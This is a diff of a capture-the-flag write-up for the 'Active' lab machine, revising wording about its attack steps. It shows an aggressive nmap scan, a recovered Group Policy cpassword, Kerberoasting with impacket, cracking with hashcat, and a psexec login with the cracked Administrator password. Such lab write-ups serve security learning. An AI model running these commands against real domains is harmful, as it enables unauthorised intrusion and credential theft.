@@ -8,8 +8,8 @@ I began my enumeration by using an inital (agressive) nmap scan to get results a
 nmap -p- -Pn -T4 10.10.10.100 --min-rate=5000
 
 -p- for scanning all ports
--Pn for no ping to disable host discovery and port scan only
--T4 for agressive (4 means aggressive, 3 is default) timing; speeds up scanning but can be unreliable
+-Pn for no ping to disable host discovery (only scan for open ports)
+-T4 for agressive (3 is default) timing; speeds up scanning but can be unreliable
 --min-rate=5000 to send packets no slower than 5000 per second; speeds ups canning but can be unreliable
 ```
 ![nmap1](Images/nmap1.png)
@@ -67,7 +67,7 @@ After downloading the XML file, I use `cat` to read the contents of the file. It
 
 Two important points to note:
 
-	• name="active.htb\SVC_TGS"
+	• userName="active.htb\SVC_TGS"
 	• cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
 
 
@@ -103,7 +103,7 @@ smb: \> ls
 		5217023 blocks of size 4096. 277084 blocks available
 ```
 
-I `cd` to go into the SVC_TGS directory, `cd` into the desktop, then list the files on the desktop with `ls`.
+I `cd` to go into the SVC_TGS directory, `cd` into the desktop, list the files on the desktop with `ls`, `get` the user.txt, and `cat` to see the user flag.
 ```
 smb: \> cd svc_tgs
 
@@ -134,7 +134,7 @@ I start by using impacket's GetUserSPNs to get a list of usernames.
 
 -request retrieves the crackable hash by requesting the TGS
 -outputfile <filename> saves the request to a file named hashes.kerberoast
--dc-ip <IP> the IP address of the domain controller we want to request info from
+-dc-ip <IP> the IP address of the domain controller I want to request info from
 ```
 
 Using hashcat, I cracked the password with the rockyou.txt wordlist.
@@ -148,7 +148,8 @@ Using hashcat, I cracked the password with the rockyou.txt wordlist.
 
 ^ At the end of that long screenshot, it shows that the password is Ticketmaster1968.  
 
-Using the newly found Administrator credentials, I can use impacket's psexec to log in, use `cd` to move to the desktop, `dir` to list the files, and `type` to view the contents of the root.txt file.
+Using the newly found Administrator credentials, I can use impacket's psexec to log in.  
+I then use `cd` to move to the administrator's desktop, `dir` to list the files, and `type` to view the contents of the root.txt file to retrieve the root flag.
 ```
 ┌──(kali㉿kali)-[~/Desktop/htb/active]
 └─$ impacket-psexec Administrator:Ticketmaster1968@10.10.10.100
